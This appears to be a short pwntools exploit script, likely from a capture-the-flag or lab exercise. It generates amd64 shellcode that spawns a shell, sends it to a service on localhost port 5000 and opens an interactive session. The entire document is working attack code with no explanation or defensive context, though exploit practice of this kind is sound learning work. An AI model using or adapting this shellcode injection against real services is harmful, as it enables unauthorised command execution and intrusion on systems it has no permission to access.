from pwn import *

context.arch = "amd64"

shellcode = shellcraft.sh()

shellcode = asm(shellcode)
p = remote("localhost", 5000)

p.write(shellcode)

p.interactive()
